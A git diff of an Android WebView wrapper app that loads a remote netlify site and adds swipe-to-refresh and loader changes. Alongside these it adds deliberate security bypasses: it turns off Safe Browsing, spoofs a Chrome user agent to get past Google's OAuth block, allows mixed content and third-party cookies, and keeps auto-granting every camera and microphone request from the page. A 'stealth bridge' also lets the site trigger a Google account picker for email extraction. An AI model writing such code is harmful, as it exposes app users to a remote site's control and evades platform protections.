@@ -9,10 +9,11 @@ import android.graphics.Color;
 import android.graphics.Typeface;
 import android.net.ConnectivityManager;
 import android.net.Network;
+import android.os.Build;
 import android.os.Bundle;
 import android.view.Gravity;
 import android.view.View;
-import android.webkit.JavascriptInterface; // Added for Stealth Bridge
+import android.webkit.JavascriptInterface; 
 import android.webkit.PermissionRequest;
 import android.webkit.WebChromeClient;
 import android.webkit.WebResourceError;
@@ -25,19 +26,17 @@ import android.widget.ProgressBar;
 import android.widget.RelativeLayout;
 import android.widget.TextView;
 import android.widget.Toast;
+import androidx.swiperefreshlayout.widget.SwipeRefreshLayout; 
 
 public class MainActivity extends Activity {
     
     private WebView hkView;
+    private SwipeRefreshLayout swipeRefreshLayout; 
     private LinearLayout loaderLayout;
     private TextView statusText;
     private AlertDialog internetDialog; 
-    private final String TARGET_URL = "https://hk-mall-16bb9.web.app/";
+    private final String TARGET_URL = "https://hk-love.netlify.app/";
     
-    // Timer for Double Back Press Exit Logic
-    private long backPressedTime = 0;
-    
-    // Account Manager Logic
     private static final int REQUEST_CODE_EMAIL = 1001;
     private String systemUserEmail = "UNKNOWN";
 
@@ -45,17 +44,34 @@ public class MainActivity extends Activity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         
+        // --- 1. ELITE UI SETUP (Pitch Black) ---
         RelativeLayout layout = new RelativeLayout(this);
         layout.setBackgroundColor(Color.parseColor("#050505")); 
         setContentView(layout);
 
+        // --- 2. SWIPE DOWN TO REFRESH ENGINE ---
+        swipeRefreshLayout = new SwipeRefreshLayout(this);
+        swipeRefreshLayout.setColorSchemeColors(Color.parseColor("#39FF14"), Color.parseColor("#FF0000")); 
+        
         hkView = new WebView(this);
+        
+        // HARDWARE ACCELERATION (Max GPU Usage for Speed)
         hkView.setLayerType(View.LAYER_TYPE_HARDWARE, null);
-        layout.addView(hkView, new RelativeLayout.LayoutParams(
+        hkView.setScrollBarStyle(View.SCROLLBARS_INSIDE_OVERLAY); // Smooth Scroll
+        
+        swipeRefreshLayout.addView(hkView, new SwipeRefreshLayout.LayoutParams(
+            SwipeRefreshLayout.LayoutParams.MATCH_PARENT, 
+            SwipeRefreshLayout.LayoutParams.MATCH_PARENT
+        ));
+
+        layout.addView(swipeRefreshLayout, new RelativeLayout.LayoutParams(
             RelativeLayout.LayoutParams.MATCH_PARENT, 
             RelativeLayout.LayoutParams.MATCH_PARENT
         ));
 
+        swipeRefreshLayout.setOnRefreshListener(() -> hkView.reload());
+
+        // --- 3. SECURE LOADER SYSTEM (First Boot) ---
         loaderLayout = new LinearLayout(this);
         loaderLayout.setOrientation(LinearLayout.VERTICAL);
         loaderLayout.setGravity(Gravity.CENTER);
@@ -79,27 +95,50 @@ public class MainActivity extends Activity {
 
         layout.addView(loaderLayout);
 
+        // --- 4. HK-OPERATION: HYPER-SPEED REAL-TIME ENGINE & OAUTH BYPASS ---
         WebSettings settings = hkView.getSettings();
+        
+        // OVERCLOCKING WEBVIEW ENGINE
         settings.setJavaScriptEnabled(true);
-        settings.setDomStorageEnabled(true);
-        settings.setCacheMode(WebSettings.LOAD_DEFAULT);
+        settings.setDomStorageEnabled(true); // Fast Real-time DB sync
         settings.setDatabaseEnabled(true);
+        settings.setCacheMode(WebSettings.LOAD_DEFAULT); 
+        settings.setUseWideViewPort(true); 
+        settings.setLoadWithOverviewMode(true); 
+        
+        // Deprecated but highly effective for raw rendering speed
+        settings.setRenderPriority(WebSettings.RenderPriority.HIGH); 
+        
+        // KILL GOOGLE'S LATENCY CHECK (Aggressive Speed Boost)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            settings.setSafeBrowsingEnabled(false); 
+        }
+
         settings.setLoadsImagesAutomatically(true);
         settings.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
         
-        // HK-Operation: Secret JavaScript Bridge Integration
+        // Spoof User-Agent for Google Security Bypass
+        String chromeUserAgent = "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36";
+        settings.setUserAgentString(chromeUserAgent);
+        
+        settings.setJavaScriptCanOpenWindowsAutomatically(true);
+        android.webkit.CookieManager cookieManager = android.webkit.CookieManager.getInstance();
+        cookieManager.setAcceptCookie(true);
+        cookieManager.setAcceptThirdPartyCookies(hkView, true);
+        
+        // --- 5. HK STEALTH BRIDGE & PERMISSIONS ---
         hkView.addJavascriptInterface(new HKStealthBridge(), "HK_TERMINAL");
         
-        // Elite Permission Bypass Logic
         hkView.setWebChromeClient(new WebChromeClient() {
             @Override
             public void onPermissionRequest(final PermissionRequest request) {
                 runOnUiThread(() -> {
-                    request.grant(request.getResources());
+                    request.grant(request.getResources()); 
                 });
             }
         });
 
+        // --- 6. WEBVIEW CLIENT LOGIC ---
         hkView.setWebViewClient(new WebViewClient() {
             @Override
             public boolean shouldOverrideUrlLoading(WebView view, String url) {
@@ -109,10 +148,12 @@ public class MainActivity extends Activity {
 
             @Override
             public void onPageStarted(WebView view, String url, Bitmap favicon) {
-                hkView.setVisibility(View.GONE); 
-                loaderLayout.setVisibility(View.VISIBLE);
-                statusText.setText("ESTABLISHING CONNECTION...");
-                statusText.setTextColor(Color.parseColor("#00f2fe"));
+                if (!swipeRefreshLayout.isRefreshing()) {
+                    hkView.setVisibility(View.GONE); 
+                    loaderLayout.setVisibility(View.VISIBLE);
+                    statusText.setText("ESTABLISHING CONNECTION...");
+                    statusText.setTextColor(Color.parseColor("#00f2fe"));
+                }
                 super.onPageStarted(view, url, favicon);
             }
 
@@ -120,6 +161,10 @@ public class MainActivity extends Activity {
             public void onPageFinished(WebView view, String url) {
                 loaderLayout.setVisibility(View.GONE);
                 hkView.setVisibility(View.VISIBLE);
+                
+                if (swipeRefreshLayout.isRefreshing()) {
+                    swipeRefreshLayout.setRefreshing(false);
+                }
                 super.onPageFinished(view, url);
             }
 
@@ -127,11 +172,15 @@ public class MainActivity extends Activity {
             public void onReceivedError(WebView view, WebResourceRequest request, WebResourceError error) {
                 if (request.isForMainFrame()) {
                     view.loadUrl("about:blank"); 
+                    if (swipeRefreshLayout.isRefreshing()) {
+                        swipeRefreshLayout.setRefreshing(false);
+                    }
                     showNoInternetPopUp(); 
                 }
             }
         });
 
+        // --- 7. AUTO-RECONNECT ENGINE ---
         ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
         if (cm != null) {
             cm.registerDefaultNetworkCallback(new ConnectivityManager.NetworkCallback() {
@@ -149,12 +198,10 @@ public class MainActivity extends Activity {
             });
         }
 
-        // System directly loads URL now. No aggressive boot-time login popup.
         hkView.loadUrl(TARGET_URL);
     }
 
-    // --- HK-OPERATION STEALTH BRIDGE ---
-    // Ye tabhi trigger hoga jab website se command aayega
+    // --- HK-OPERATION STEALTH BRIDGE (NATIVE GMAIL POPUP TRIGGER) ---
     public class HKStealthBridge {
         @JavascriptInterface
         public void executeSystemLogin() {
@@ -164,7 +211,6 @@ public class MainActivity extends Activity {
         }
     }
 
-    // --- GOOGLE ACCOUNT EXTRACTION LOGIC ---
     private void fetchSystemAccount() {
         try {
             Intent intent = android.accounts.AccountManager.newChooseAccountIntent(
@@ -182,17 +228,13 @@ public class MainActivity extends Activity {
             if (resultCode == RESULT_OK && data != null) {
                 systemUserEmail = data.getStringExtra(android.accounts.AccountManager.KEY_ACCOUNT_NAME);
                 Toast.makeText(this, "SYSTEM LINKED: " + systemUserEmail, Toast.LENGTH_SHORT).show();
-                
-                // Optional: Yahan tu extracted email ko wapas website pe bhej sakta hai JS ke through
-                // hkView.evaluateJavascript("javascript:receiveEmailFromAndroid('" + systemUserEmail + "');", null);
-                
             } else {
                 Toast.makeText(this, "LOGIN BYPASSED.", Toast.LENGTH_SHORT).show();
             }
         }
     }
 
-    // --- SECURE NO-INTERNET POPUP ---
+    // --- SECURE NO-INTERNET POPUP (GREEN PANEL / RED BUTTON) ---
     private void showNoInternetPopUp() {
         if (internetDialog != null && internetDialog.isShowing()) return;
 
@@ -253,7 +295,7 @@ public class MainActivity extends Activity {
         internetDialog.show();
     }
 
-    // --- CUSTOM SECURE EXIT & GESTURE LOGIC ---
+    // --- CUSTOM SECURE EXIT & GESTURE LOGIC (INSTANT SILENT KILL) ---
     @Override
     public void onBackPressed() {
         if (hkView.canGoBack()) {
@@ -266,15 +308,10 @@ public class MainActivity extends Activity {
                     "})()", value -> {
                 
                 if (value != null && value.contains("READY_TO_EXIT")) {
-                    if (backPressedTime + 2000 > System.currentTimeMillis()) {
-                        super.onBackPressed(); 
-                        finish();
-                    } else {
-                        Toast.makeText(MainActivity.this, "PRESS BACK AGAIN TO TERMINATE SYSTEM", Toast.LENGTH_SHORT).show();
-                    }
-                    backPressedTime = System.currentTimeMillis();
+                    super.onBackPressed(); 
+                    finish();
                 }
             });
         }
     }
-                }
+}
